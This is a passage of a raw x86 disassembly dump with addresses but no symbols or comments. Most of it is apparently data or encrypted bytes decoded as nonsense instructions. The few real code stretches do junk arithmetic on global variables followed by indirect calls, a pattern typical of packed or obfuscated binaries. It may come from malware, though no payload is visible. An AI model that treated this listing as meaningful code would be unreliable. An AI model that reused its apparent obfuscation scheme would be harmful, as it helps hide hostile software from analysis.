  41742a:	mov    DWORD PTR [esi-0x3cd2f860],eax
  417430:	jmp    0x6a21ac6
  417435:	in     eax,dx
  417436:	xchg   BYTE PTR [esi+edx*8],al
  417439:	aaa    
  41743a:	dec    esp
  41743b:	add    BYTE PTR [edx-0xc],bl
  41743e:	ins    DWORD PTR es:[edi],dx
  41743f:	jl     0x417432
  417441:	enter  0xea2b,0x9
  417445:	mov    ch,0xe9
  417447:	and    ah,BYTE PTR ds:[ebp+0x4e10557b]
  41744e:	inc    esp
  41744f:	inc    edi
  417450:	push   ds
  417451:	mov    dh,0x90
  417453:	dec    edi
  417454:	pop    ebx
  417455:	inc    ecx
  417456:	nop
  417457:	and    DWORD PTR [ecx+0x20328ff1],ecx
  41745d:	mov    ebx,0x64c1126c
  417462:	or     DWORD PTR [eax+0x1573dc90],ecx
  417468:	jl     0x4174c3
  41746a:	sub    eax,0x97feede7
  41746f:	jae    0x4174a5
  417471:	sub    al,0x11
  417473:	test   eax,0x2af3a4aa
  417478:	sahf   
  417479:	jp     0x4174a7
  41747b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41747c:	rcr    DWORD PTR [ebp+0x6ab44c96],1
  417482:	adc    DWORD PTR [esi-0x2e8b36a0],eax
  417488:	stos   DWORD PTR es:[edi],eax
  417489:	push   ebp
  41748a:	les    esp,FWORD PTR [esi-0x724d952]
  417490:	cdq    
  417491:	(bad)  
  417492:	fadd   DWORD PTR [esi]
  417494:	ins    DWORD PTR es:[edi],dx
  417495:	inc    esi
  417496:	mov    WORD PTR [edi-0x6a],gs
  417499:	nop
  41749a:	add    DWORD PTR [ebx],ebx
  41749c:	jge    0x417479
  41749e:	adc    eax,edi
  4174a0:	repnz (bad) 
  4174a2:	int3   
  4174a3:	ins    DWORD PTR es:[edi],dx
  4174a4:	inc    ebx
  4174a5:	dec    edi
  4174a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174a7:	sbb    BYTE PTR [esi],cl
  4174a9:	ficomp WORD PTR [edi+0x7]
  4174ac:	out    dx,eax
  4174ad:	jg     0x41748b
  4174af:	imul   ecx,DWORD PTR [ebx],0x7650b846
  4174b5:	outs   dx,BYTE PTR ds:[esi]
  4174b6:	inc    eax
  4174b7:	push   ebx
  4174b8:	js     0x4174f8
  4174ba:	add    BYTE PTR [ebp+0x335a50f2],0xc1
  4174c1:	sub    edx,eax
  4174c3:	cmp    edi,edx
  4174c5:	jbe    0x4170cf
  4174cb:	pop    edi
  4174cc:	pop    esi
  4174cd:	pop    ebx
  4174ce:	leave  
  4174cf:	ret    0x8
  4174d2:	push   ebp
  4174d3:	mov    ebp,esp
  4174d5:	and    esp,0xfffffff8
  4174d8:	sub    esp,0x9c
  4174de:	push   ebx
  4174df:	push   esi
  4174e0:	push   edi
  4174e1:	push   DWORD PTR ds:0x422384
  4174e7:	lea    eax,[esp+0xa4]
  4174ee:	push   eax
  4174ef:	call   DWORD PTR ds:0x428e20
  4174f5:	push   DWORD PTR [esp+0xa4]
  4174fc:	push   DWORD PTR ds:0x422370
  417502:	call   DWORD PTR ds:0x428e44
  417508:	push   eax
  417509:	call   DWORD PTR ds:0x428e2c
  41750f:	mov    ecx,DWORD PTR ds:0x422738
  417515:	sub    DWORD PTR ds:0x4282bf,0x42833b
  41751f:	jmp    0x4178ee
  417524:	iret   
  417525:	and    ah,BYTE PTR [esi]
  417527:	inc    eax
  417528:	sbb    bh,BYTE PTR [edi+ebp*4]
  41752b:	and    cl,BYTE PTR [ecx+edx*8]
  41752e:	fnstcw WORD PTR [esp+eiz*4+0xaaa18c9]
  417535:	out    0x16,eax
  417537:	sbb    BYTE PTR [edx+edx*1-0x5e6ee7e8],bh
  41753e:	or     al,0x29
  417540:	sub    bl,BYTE PTR [edi+ecx*2-0x1d661dcf]
  417547:	imul   ebp
  417549:	punpcklbw mm1,DWORD PTR [ecx+eax*8]
  41754d:	mov    eax,0x97ae783f
  417552:	jnp    0x41756f
  417554:	ins    DWORD PTR es:[edi],dx
  417555:	mov    ah,0x2
  417557:	das    
  417558:	inc    edi
  417559:	xchg   BYTE PTR [eax+ecx*8-0x18],bl
  41755d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41755e:	ds in  al,dx
  417560:	retf   
  417561:	jmp    0xf9c81a0b
  417566:	call   0x8b96:0xdadbb10f
  41756d:	add    al,0x20
  41756f:	in     al,0xfa
  417571:	retf   
  417572:	data16 lods al,BYTE PTR ds:[esi]
  417574:	mov    al,0xc4
  417576:	sbb    BYTE PTR [edi+ebp*1-0x1190db75],bh
  41757d:	cld    
  41757e:	hlt    
  41757f:	xchg   esp,eax
  417580:	bound  ebx,QWORD PTR es:[edi-0x13]
  417584:	push   edx
  417585:	stos   DWORD PTR es:[edi],eax
  417586:	lea    ebx,[edi+0x6e]
  417589:	mov    WORD PTR [edx-0x3c212787],ss
  41758f:	inc    ebp
  417590:	gs icebp 
  417592:	dec    ebx
  417593:	xchg   edi,eax
  417594:	inc    edx
  417595:	cli    
  417596:	push   0x9adacfd6
  41759b:	sub    dh,0xac
  41759e:	xlat   BYTE PTR ds:[ebx]
  41759f:	retf   0xfda9
  4175a2:	imul   eax,DWORD PTR [esi-0x1c],0xc1b89c67
  4175a9:	mov    cl,0x3a
  4175ab:	popf   
  4175ac:	mov    ebx,0xe8e2f730
  4175b1:	sub    ebp,eax
  4175b3:	test   al,0x97
  4175b5:	push   esi
  4175b6:	cdq    
  4175b7:	lahf   
  4175b8:	mov    al,0xff
  4175ba:	imul   edx,DWORD PTR [esi+0x1e],0xf4427cf
  4175c1:	add    BYTE PTR [esi+edi*1],dh
  4175c4:	mov    ds:0xa258c80c,eax
  4175c9:	sbb    bh,BYTE PTR [esp+edi*1]
  4175cc:	nop
  4175cd:	mov    ebp,esi
  4175cf:	mov    al,ds:0xabef3858
  4175d4:	ins    BYTE PTR es:[edi],dx
  4175d5:	mov    cl,0x64
  4175d7:	jmp    0x4175b6
  4175d9:	add    DWORD PTR [ebx-0x57462b52],esp
  4175df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175e0:	fcomp  QWORD PTR [eax]
  4175e2:	sbb    edi,DWORD PTR [eax-0x70b607f9]
  4175e8:	jge    0x4175bd
  4175ea:	or     eax,0x90cba378
  4175ef:	sub    BYTE PTR [esi],0xa5
  4175f2:	fdivr  DWORD PTR [edi]
  4175f4:	cwde   
  4175f5:	xor    DWORD PTR [eax+eiz*8],edi
  4175f8:	xor    ch,BYTE PTR [eax]
  4175fa:	xor    esp,esp
  4175fc:	add    bl,BYTE PTR [esi-0x9]
  4175ff:	pop    esi
  417600:	nop
  417601:	pop    es
  417602:	mov    bl,0xf
  417604:	mov    eax,cs
  417606:	jge    0x4175d0
  417608:	loop   0x417620
  41760a:	gs jl  0x4175fc
  41760d:	in     al,dx
  41760e:	out    0x7d,al
  417610:	jmp    FWORD PTR ds:0x72c6a2c4
  417616:	mov    eax,eax
  417618:	pop    ss
  417619:	shl    edi,cl
  41761b:	cmp    dl,BYTE PTR [ebp+0x86a7168]
  417621:	xchg   esi,eax
  417622:	(bad)  
  417623:	mov    esp,DWORD PTR [eax-0x7aa65130]
  417629:	sahf   
  41762a:	sub    esp,DWORD PTR [edi]
  41762c:	pop    ecx
  41762d:	arpl   WORD PTR [ebx-0x1d45c07e],ax
  417633:	jl     0x4175cd
  417635:	jge    0x4176b1
  417637:	pop    edx
  417638:	ror    DWORD PTR [edi+0x4c0fb10f],0x63
  41763f:	sub    al,0x1c
  417641:	mov    DWORD PTR [edi],ecx
  417643:	in     eax,dx
  417644:	popa   
  417645:	push   edx
  417646:	mov    esp,edi
  417648:	out    0x54,eax
  41764a:	jmp    DWORD PTR [eax-0x7a3b551d]
  417650:	repnz aaa 
  417652:	mov    bh,0x3c
  417654:	lahf   
  417655:	xchg   edx,eax
  417656:	xchg   ebx,eax
  417657:	push   edx
  417658:	(bad)  
  41765a:	iret   
  41765b:	add    BYTE PTR ds:0xdc248aed,ah
  417661:	bound  edx,QWORD PTR [eax+0x43]
  417664:	clc    
  417665:	in     al,dx
  417666:	pop    edi
  417667:	(bad)  
  417669:	push   ebp
  41766a:	call   0xfb35:0x368d1050
  417671:	mov    esi,0xce61d032
  417676:	cwde   
  417677:	scas   al,BYTE PTR es:[edi]
  417678:	or     eax,0x468a265
  41767d:	jno    0x417643
  41767f:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417681:	add    al,0x18
  417683:	lods   al,BYTE PTR ds:[esi]
  417684:	sbb    bl,BYTE PTR [ebp+edx*1+0x3c5b1bf6]
  41768b:	or     esi,eax
  41768d:	xchg   al,dh
  41768f:	jmp    0x5d5c15e1
  417694:	bound  ecx,QWORD PTR [ecx+edi*4-0x6f3a0ea2]
  41769b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41769c:	cld    
  41769d:	adc    al,0x73
  41769f:	adc    DWORD PTR [eax-0x1a80e4e9],edi
  4176a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176a6:	outs   dx,BYTE PTR ds:[esi]
  4176a7:	nop
  4176a8:	inc    eax
  4176a9:	jge    0x4176e2
  4176ab:	loop   0x41766e
  4176ad:	imul   edx,DWORD PTR es:[edi*4-0x6cd87bd5],0x1
  4176b6:	push   ebp
  4176b7:	jb     0x4176a4
  4176b9:	and    edx,ecx
  4176bb:	stos   BYTE PTR es:[edi],al
  4176bc:	or     esp,0x259bc342
  4176c2:	pop    esp
  4176c3:	push   ss
  4176c4:	add    eax,0x540f08a9
  4176c9:	mov    es,ebx
  4176cb:	out    0x55,eax
  4176cd:	rol    DWORD PTR [ecx],0x7d
  4176d0:	jecxz  0x417700
  4176d2:	leave  
  4176d3:	xor    ah,BYTE PTR [ebx]
  4176d5:	pop    esp
  4176d6:	mov    cl,0xbf
  4176d8:	sub    edx,esp
  4176da:	jae    0x4176f0
  4176dc:	pop    ecx
  4176dd:	jmp    0x9f8bc1af
  4176e2:	aaa    
  4176e3:	aad    0xb0
  4176e5:	add    eax,0x6dd25149
  4176ea:	add    edi,0x4b
  4176ed:	repz xor al,0x31
  4176f0:	push   ebp
  4176f1:	xchg   ebx,eax
  4176f2:	pop    ds
  4176f3:	lahf   
  4176f4:	xchg   ebp,eax
  4176f5:	add    ch,BYTE PTR [edx]
  4176f7:	fistp  WORD PTR [ebp-0x21]
  4176fa:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4176fc:	aas    
  4176fd:	cmp    BYTE PTR [esi+ecx*4-0x7cfced64],ah
  417704:	cmc    
  417705:	repnz (bad) 
  417707:	popa   
  417708:	sub    al,0x1
  41770a:	push   ds
  41770b:	dec    ecx
  41770c:	jb     0x4176a9
  41770e:	cmp    cl,BYTE PTR [ecx]
  417710:	sub    eax,0x88de0184
  417715:	cli    
  417716:	or     BYTE PTR [ecx],ch
  417718:	mov    esp,0x9d00f430
  41771d:	retf   
  41771e:	and    al,0x3d
  417720:	or     esp,esp
  417722:	push   edx
  417723:	popa   
  417724:	xor    al,0xb7
  417726:	jb     0x41770c
  417728:	data16 jecxz 0x4176f8
  41772b:	or     al,BYTE PTR [eax-0x1d]
  41772e:	cmp    BYTE PTR [esi],dl
  417730:	subps  xmm1,XMMWORD PTR [ecx]
  417733:	retf   
  417734:	mov    ebx,DWORD PTR [esi]
  417736:	ret    0xce66
  417739:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41773a:	retf   
  41773b:	push   ebx
  41773c:	inc    esi
  41773d:	mov    bh,0x28
  41773f:	mov    ds:0x20ee853c,eax
  417744:	cmp    ah,BYTE PTR [eax-0x5def483d]
  41774a:	sub    ah,dh
  41774c:	mov    al,ds:0xce23f730
  417751:	gs mov dl,0x7
  417754:	xchg   DWORD PTR [ebx-0x1f4d5303],esp
  41775a:	out    0x38,eax
  41775c:	fs mov edx,0xa32e8a12
  417762:	pushf  
  417763:	lods   al,BYTE PTR ds:[esi]
  417764:	sahf   
  417765:	pop    ds
  417766:	adc    eax,0x270ceb55
  41776b:	loopne 0x417739
  41776d:	(bad)  
  41776e:	jmp    0x26fa2ada
  417773:	push   edx
  417774:	mov    ds:0xc925be89,al
  417779:	dec    edi
  41777a:	xor    al,0x2b
  41777c:	mov    ecx,0xf9f3ee71
  417781:	je     0x417745
  417783:	push   0x41d416d2
  417788:	xchg   ebx,eax
  417789:	bswap  ebx
  41778b:	xchg   edi,eax
  41778c:	mov    ah,0xba
  41778e:	int3   
  41778f:	xchg   esi,ebx
  417791:	loopne 0x417795
  417793:	hlt    
  417794:	add    ebp,DWORD PTR [esi+0x68]
  417797:	repnz adc esi,DWORD PTR [ebx+0x11]
  41779b:	and    ebx,DWORD PTR [ebx]
  41779d:	adc    esp,DWORD PTR [ecx*2-0x3bc9d24e]
  4177a4:	int3   
  4177a5:	add    al,0x37
  4177a7:	cld    
  4177a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177a9:	mov    bh,dl
  4177ab:	cwde   
  4177ac:	dec    eax
  4177ad:	std    
  4177ae:	test   eax,0x91537092
  4177b3:	fidivr DWORD PTR [eax+0x60]
  4177b6:	fwait
  4177b7:	inc    esp
  4177b8:	mov    eax,0xf4b02ba2
  4177bd:	mov    ds:0x4fffc748,al
  4177c2:	dec    edx
  4177c3:	or     BYTE PTR [edx+0x77ee8896],dh
  4177c9:	inc    ebp
  4177ca:	cs jp  0x41778e
  4177cd:	mov    ebx,0x912f5ad9
  4177d2:	scas   al,BYTE PTR es:[edi]
  4177d3:	push   edx
  4177d4:	mov    ebx,0xf2e96583
  4177d9:	je     0x417774
  4177db:	cmp    esi,DWORD PTR [esi-0x26]
  4177de:	add    ah,BYTE PTR [eax]
  4177e0:	xchg   ebp,eax
  4177e1:	lods   al,BYTE PTR ds:[esi]
  4177e2:	xchg   edx,eax
  4177e3:	fmul   QWORD PTR es:[ecx-0x60dab4de]
  4177ea:	dec    edx
  4177eb:	shr    BYTE PTR ds:[ebx],cl
  4177ee:	lahf   
  4177ef:	loop   0x4177bb
  4177f1:	xor    DWORD PTR [ecx],edx
  4177f3:	mov    al,ds:0x8610bb2e
  4177f8:	cs popf 
  4177fa:	in     al,0x25
  4177fc:	inc    ebp
  4177fd:	or     DWORD PTR [eax+0x69c8416a],edi
  417803:	out    0x12,al
  417805:	ds retf 0xd75f
  417809:	loope  0x41780f
  41780b:	into   
  41780c:	cwde   
  41780d:	das    
  41780e:	inc    ecx
  41780f:	add    DWORD PTR [ecx],edx
  417811:	push   ecx
  417812:	mov    al,ds:0x200ecb98
  417817:	adc    ebx,DWORD PTR [edx]
  417819:	cwde   
  41781a:	(bad)  
  41781b:	leave  
  41781c:	into   
  41781d:	xor    ebp,edx
  41781f:	sbb    ah,BYTE PTR [ebp+ebx*2-0x7139b5de]
  417826:	jmp    0x41781e
  417828:	add    al,0x3
  41782a:	cmp    DWORD PTR [ebx],esp
  41782c:	cwde   
  41782d:	scas   eax,DWORD PTR es:[edi]
  41782e:	adc    ebp,DWORD PTR ds:0xef7d1bb4
  417834:	sub    DWORD PTR [ecx],ebp
  417836:	ror    DWORD PTR [ebx+0x10],cl
  417839:	repnz enter 0x90cc,0xa9
  41783e:	lds    esp,FWORD PTR [edi-0x19]
  417841:	jbe    0x41785d
  417843:	sbb    DWORD PTR [ecx-0x76],esi
  417846:	fs sti 
  417848:	fs enter 0xa2ab,0x7a
  41784d:	or     eax,0xa391a018
  417852:	sub    al,0x32
  417854:	jnp    0x41788b
  417856:	fidivr DWORD PTR [edx]
  417858:	pop    esp
  417859:	push   ss
  41785a:	cdq    
  41785b:	mov    esp,DWORD PTR [edx+eax*1]
  41785e:	mov    ebp,0xaddffd98
  417863:	and    ah,BYTE PTR [esi]
  417865:	jmp    0xc22dfd06
  41786a:	cmp    BYTE PTR [esi-0x3d2bf7f6],dh
  417870:	add    DWORD PTR [edi-0x62798372],ecx
  417876:	scas   eax,DWORD PTR es:[edi]
  417877:	ret    
  417878:	lods   al,BYTE PTR ds:[esi]
  417879:	loop   0x4178bf
  41787b:	inc    eax
  41787c:	inc    eax
  41787d:	sbb    al,0x2c
  41787f:	nop
  417880:	fbld   TBYTE PTR [edx+0xb8a8052]
  417886:	ins    BYTE PTR es:[edi],dx
  417887:	xchg   ebx,eax
  417888:	cs jnp 0x417894
  41788b:	(bad)  
  41788c:	cmp    edi,ebp
  41788e:	mov    esi,DWORD PTR [ecx-0x28]
  417891:	loope  0x417872
  417893:	cmp    al,0x92
  417895:	lahf   
  417896:	mov    ecx,0xcd988350
  41789b:	dec    edi
  41789c:	mov    esp,ecx
  41789e:	dec    edi
  41789f:	mov    WORD PTR [edi+0x24],ds
  4178a2:	in     eax,dx
  4178a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178a4:	inc    edx
  4178a5:	inc    esp
  4178a6:	je     0x417876
  4178a8:	xchg   edi,eax
  4178a9:	imul   edx,DWORD PTR [edi-0x5737a408],0xad16d05a
  4178b3:	or     BYTE PTR [ebp-0x78],cl
  4178b6:	mov    al,0x18
  4178b8:	add    eax,0x39c565a
  4178bd:	jge    0x41791f
  4178bf:	cmp    edx,esi
  4178c1:	inc    ecx
  4178c2:	sub    dh,BYTE PTR [edx-0x172f976c]
  4178c8:	fild   WORD PTR [ebx+0x347cc8a4]
  4178ce:	arpl   WORD PTR [eax+edi*1-0x6f],si
  4178d2:	xor    ebx,eax
  4178d4:	add    al,0xf
  4178d6:	fisub  WORD PTR [bp+si+0x45a8]
  4178db:	pusha  
  4178dc:	ja     0x417959
  4178de:	and    al,0xfd
  4178e0:	sti    
  4178e1:	out    0x95,al
  4178e3:	and    edi,DWORD PTR [ebx+0x1fabb2e5]
  4178e9:	(bad)  
  4178ea:	sub    ebx,DWORD PTR [eax]
  4178ec:	push   0xffffffd1
  4178ee:	push   0x0
  4178f0:	and    DWORD PTR ds:0x428257,0x6fb6
  4178fa:	push   DWORD PTR [ecx]
  4178fc:	or     DWORD PTR ds:0x4281f7,0x652f
  417906:	call   eax
  417908:	adc    esi,DWORD PTR ds:0x42820f
  41790e:	mov    esi,0x1ff
  417913:	add    eax,eax
  417915:	mov    DWORD PTR [esp+0x24],0x3992
  41791d:	mov    DWORD PTR [esp+0xc],0x79a2
  417925:	add    DWORD PTR ds:0x4281f7,0x3f4a
  41792f:	mov    eax,DWORD PTR [esp+0xc]
  417933:	mov    ecx,DWORD PTR ds:0x428297
  417939:	mov    ecx,DWORD PTR [ecx]
  41793b:	and    DWORD PTR ds:0x42825f,ecx
  417941:	mov    ecx,DWORD PTR [esp+0x24]
  417945:	sub    DWORD PTR ds:0x42820f,0x428217
  41794f:	xor    eax,0x1d22
  417954:	xor    DWORD PTR ds:0x4282d3,0x3de5
  41795e:	imul   eax,eax,0xffffdeb4
  417964:	and    eax,0x43eb
  417969:	sub    eax,ecx
  41796b:	xor    DWORD PTR ds:0x42822f,0x42815b
  417975:	mov    DWORD PTR [esp+0x3c],eax
  417979:	xor    DWORD PTR ds:0x42811b,0x24fe
  417983:	mov    DWORD PTR [esp+0x38],0x3b18
  41798b:	mov    DWORD PTR [esp+0x2c],0x6c93
  417993:	adc    DWORD PTR ds:0x42821f,0x3367
  41799d:	mov    DWORD PTR [esp+0x24],0x418e
  4179a5:	add    DWORD PTR ds:0x42825b,ebx
  4179ab:	mov    DWORD PTR [esp+0xc],0x5ac3
  4179b3:	xor    ecx,ecx
  4179b5:	add    ecx,DWORD PTR ds:0x428367
  4179bb:	add    DWORD PTR ds:0x42812b,ecx
  4179c1:	mov    eax,DWORD PTR [esp+0xc]
  4179c5:	mov    ecx,DWORD PTR [esp+0x24]
  4179c9:	add    DWORD PTR ds:0x428253,0x705
  4179d3:	sub    ecx,eax
  4179d5:	and    eax,0x1ffb
  4179da:	mov    eax,DWORD PTR [esp+0x2c]
  4179de:	and    ecx,eax
  4179e0:	mov    eax,DWORD PTR [esp+0x38]
  4179e4:	sbb    DWORD PTR ds:0x428113,0x42832f
  4179ee:	xor    ecx,0x10d6
  4179f4:	sub    ecx,0x782c
  4179fa:	imul   ecx,eax
  4179fd:	mov    eax,0x7fd0
  417a02:	mov    eax,DWORD PTR [esp+0x3c]
  417a06:	cmp    eax,ecx
  417a08:	mov    DWORD PTR ds:0x42812b,0x7353
  417a12:	jne    0x41890f
  417a18:	and    eax,eax
  417a1a:	mov    DWORD PTR [esp+0x10],0x1
  417a22:	mov    DWORD PTR [esp+0x30],0x2f16
  417a2a:	xor    ecx,DWORD PTR ds:0x428217
  417a30:	mov    DWORD PTR [esp+0x48],0x16f
  417a38:	mov    DWORD PTR [esp+0x50],0x30c5
  417a40:	add    DWORD PTR ds:0x4282b7,edx
  417a46:	push   DWORD PTR ds:0xe5bfd6f1
  417a4c:	cmp    DWORD PTR ds:0x428233,0x0
  417a53:	mov    DWORD PTR ds:0x4282af,edx
  417a59:	mov    ecx,0x328
  417a5e:	mov    ecx,0x6d04
  417a63:	jmp    0x417abd
  417a68:	mov    DWORD PTR ds:0x428227,0x44f5
  417a72:	cmp    DWORD PTR ds:0x428233,0x0
  417a79:	je     0x417a9d
  417a7f:	push   DWORD PTR [ebp-0x18]
  417a82:	push   DWORD PTR [ebp-0x18]
  417a85:	push   0x8f00
  417a8a:	push   DWORD PTR [ebp-0x10]
  417a8d:	call   DWORD PTR ds:0x428da4
  417a93:	not    ecx
  417a95:	sub    ecx,ecx
  417a97:	or     DWORD PTR ds:0x428207,ebx
  417a9d:	mov    ecx,DWORD PTR ds:0x428293
  417aa3:	mov    ecx,DWORD PTR [ecx]
  417aa5:	and    DWORD PTR ds:0x42814b,ecx
  417aab:	sbb    ecx,0x5390
  417ab1:	add    ecx,0xb3f
  417ab7:	add    DWORD PTR ds:0x42815b,edi
  417abd:	mov    DWORD PTR [esp+0x8c],0x4ebc
  417ac8:	xor    eax,eax
  417aca:	mov    DWORD PTR [esp+0x98],0x76
  417ad5:	mov    DWORD PTR [esp+0x40],0x556d
  417add:	neg    DWORD PTR ds:0x42811f
  417ae3:	jmp    0x417eb2
  417ae8:	(bad)  [eax-0x2]
  417aec:	xor    BYTE PTR [edx+0x1a],bh
  417aef:	fwait
  417af0:	clc    
  417af1:	dec    edi
  417af2:	arpl   WORD PTR [esp+edx*8-0x514f400b],di
  417af9:	loope  0x417b11
  417afb:	sbb    BYTE PTR [edx+edx*1+0x70d11818],bh
  417b02:	mov    eax,0x939e031
  417b07:	out    0x4c,al
  417b09:	jp     0x417b6a
  417b0b:	cmp    DWORD PTR [esi],esp
  417b0d:	(bad)  
  417b0e:	aad    0xf7
  417b10:	inc    ebp
  417b11:	push   es
  417b12:	cld    
  417b13:	ins    DWORD PTR es:[edi],dx
  417b14:	loop   0x417b79
  417b16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b17:	test   cl,0x9f
  417b1a:	ja     0x417b03
  417b1c:	rcr    DWORD PTR [ebx-0x6e6b2332],0xc2
  417b23:	fisttp WORD PTR [edx-0x68]
  417b26:	mov    ebx,0xf24c0a63
  417b2b:	repz aas 
  417b2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b2e:	pushf  
  417b2f:	sub    DWORD PTR [ecx],0xfffffffc
  417b32:	les    eax,FWORD PTR [esi-0x19]
  417b35:	mov    dl,0xb2
  417b37:	push   edx
  417b38:	xchg   ecx,eax
  417b39:	or     DWORD PTR [eax+0x1bf001af],edi
  417b3f:	dec    esi
  417b40:	jmp    0x417b83
  417b42:	push   cs
  417b43:	or     al,0xa4
  417b45:	ss mov cl,0x39
  417b48:	ror    BYTE PTR [ebp-0x40],1
  417b4b:	fstp   QWORD PTR [eax-0x10]
  417b4e:	test   BYTE PTR [ebx],ah
  417b50:	xchg   esp,eax
  417b51:	das    
  417b52:	fwait
  417b53:	stos   DWORD PTR es:[edi],eax
  417b54:	xchg   ebx,eax
  417b55:	jae    0x417af3
  417b57:	lods   al,BYTE PTR ds:[esi]
  417b58:	xlat   BYTE PTR ds:[ebx]
  417b59:	je     0x417b65
  417b5b:	dec    ebx
  417b5c:	mov    eax,0x59b93208
  417b61:	add    al,0xa7
  417b63:	test   BYTE PTR [edi+0x219baaea],0x41
  417b6a:	jl     0x417b72
  417b6c:	push   ebp
  417b6d:	cmp    BYTE PTR [ecx-0x56],ch
  417b70:	xor    eax,0x6c167666
  417b75:	dec    ebx
  417b76:	pop    esi
  417b77:	pop    ss
  417b78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b79:	xchg   ecx,eax
  417b7a:	das    
  417b7b:	test   DWORD PTR [eax+edi*2+0x22],ebx
  417b7f:	ret    
  417b80:	out    0x29,al
  417b82:	into   
  417b83:	retf   0xad8e
  417b86:	stc    
  417b87:	cmp    DWORD PTR [edi],edi
  417b89:	fld    st(7)
  417b8b:	adc    ebx,DWORD PTR [edi+0x60]
  417b8e:	js     0x417b23
  417b90:	inc    esi
  417b91:	daa    
  417b92:	sahf   
  417b93:	and    BYTE PTR [esi-0x50],ah
  417b96:	xor    al,0xdf
  417b98:	sbb    BYTE PTR [ecx-0x4ca7f846],dh
  417b9e:	in     eax,dx
  417b9f:	aam    0x33
  417ba1:	pop    eax
  417ba2:	cmp    BYTE PTR ds:0x7618454a,0xa2
  417ba9:	adc    al,0x7a
  417bab:	jg     0x417c0e
  417bad:	adc    al,0x4d
  417baf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bb0:	daa    
  417bb1:	pop    edi
  417bb2:	inc    eax
  417bb3:	pushf  
  417bb4:	mov    ds:0x7dcf3026,al
  417bb9:	add    edi,eax
  417bbb:	cmp    ebp,DWORD PTR [esi-0x5]
  417bbe:	outs   dx,BYTE PTR ds:[esi]
  417bbf:	fst    QWORD PTR [ecx-0x67fe0e7a]
  417bc5:	fist   WORD PTR [ebx+0x76493f21]
  417bcb:	in     al,dx
  417bcc:	pop    es
  417bcd:	and    BYTE PTR [ecx+0x61],ch
  417bd0:	push   edx
  417bd1:	cdq    
  417bd2:	cmp    BYTE PTR [edi-0x24],bh
  417bd5:	pop    esi
  417bd6:	xchg   esi,eax
  417bd7:	ds inc esp
  417bd9:	mov    ds:0x1b29bf1,al
  417bde:	sar    eax,0x83
  417be1:	test   bl,bl
  417be3:	pop    es
  417be4:	and    cl,BYTE PTR [edx+edi*1-0x3d7a238]
  417beb:	leave  
  417bec:	cs push ds
  417bee:	sbb    DWORD PTR [esi-0x76],esp
  417bf1:	fst    DWORD PTR [eax-0x27]
  417bf4:	cdq    
  417bf5:	test   al,0xcc
  417bf7:	aad    0xbe
  417bf9:	mov    cl,0xfc
  417bfb:	bound  ebp,QWORD PTR [ecx+0x46]
  417bfe:	fisttp WORD PTR [esi-0x25]
  417c01:	or     ebx,DWORD PTR [eax]
  417c03:	lahf   
  417c04:	fwait
  417c05:	gs push ebp
  417c07:	mov    cl,0x18
  417c09:	xchg   ebx,eax
  417c0a:	push   es
  417c0b:	jmp    0xa174:0x57bc0b13
  417c12:	(bad)  
  417c13:	iret   
  417c14:	adc    esp,DWORD PTR [ebx-0x9bf9d02]
  417c1a:	div    DWORD PTR [ebx-0x11]
  417c1d:	sar    DWORD PTR [ebp+0x56125952],cl
  417c23:	rol    BYTE PTR [edi+0x7f2f5a2f],cl
  417c29:	popa   
  417c2a:	(bad)  
  417c2b:	mov    eax,0xa0fc7f78
  417c30:	lea    ebp,[edx+0x2e5e9e10]
  417c36:	call   0xdb4f:0x86a3ddcc
  417c3d:	je     0x417c9d
  417c3f:	les    ebp,FWORD PTR [ebp+0x59ef2a8a]
  417c45:	add    al,0x28
  417c47:	out    dx,eax
  417c48:	mov    dl,0x89
  417c4a:	outs   dx,DWORD PTR ds:[esi]
  417c4b:	cwde   
  417c4c:	adc    DWORD PTR [eax],ecx
  417c4e:	add    al,0x6a
  417c50:	popf   
  417c51:	cs cmp eax,0xe2b77a1a
  417c57:	inc    ebx
  417c58:	add    esp,eax
  417c5a:	popf   
  417c5b:	rcr    cl,1
  417c5d:	sub    DWORD PTR [edx+0x3c],ebp
  417c60:	sbb    eax,0xfee21140
  417c65:	cs xchg ecx,eax
  417c67:	icebp  
  417c68:	(bad)  
  417c69:	iret   
  417c6a:	sbb    dl,BYTE PTR [eax]
  417c6c:	cmp    ebp,0xffffff84
  417c6f:	cmc    
  417c70:	ret    0xf2ed
  417c73:	clc    
  417c74:	xor    cl,ah
  417c76:	and    BYTE PTR [eax-0x78828819],0xaf
  417c7d:	rcl    BYTE PTR [ebp-0x1b],1
  417c80:	sbb    BYTE PTR [ecx],ch
  417c82:	add    eax,0xe713793c
  417c87:	pushf  
  417c88:	cmp    eax,0xde8931bb
  417c8d:	jecxz  0x417c3d
  417c8f:	imul   ecx,ebp,0xc0fd7c2e
  417c95:	js     0x417d14
  417c97:	inc    esp
  417c98:	aam    0x2e
  417c9a:	sbb    ch,dh
  417c9c:	(bad)  
  417c9d:	pop    eax
  417c9e:	dec    esp
  417c9f:	cld    
  417ca0:	loop   0x417c77
  417ca2:	inc    ecx
  417ca3:	into   
  417ca4:	call   0x4760d734
  417ca9:	add    ah,ch
  417cab:	cli    
  417cac:	dec    esi
  417cad:	pop    ds
  417cae:	and    DWORD PTR [edx+ebx*2],esi
  417cb1:	dec    esp
  417cb2:	repz dec esp
  417cb4:	push   cs
  417cb5:	pop    eax
  417cb6:	lock push 0x39
  417cb9:	iret   
  417cba:	es das 
  417cbc:	add    DWORD PTR [ebp-0x29],esp
  417cbf:	or     edi,DWORD PTR [eax]
  417cc1:	inc    ebx
  417cc2:	dec    esp
  417cc3:	loop   0x417d2b
  417cc5:	int    0x63
  417cc7:	sahf   
  417cc8:	push   0xc2131256
  417ccd:	mov    edi,0x3969c631
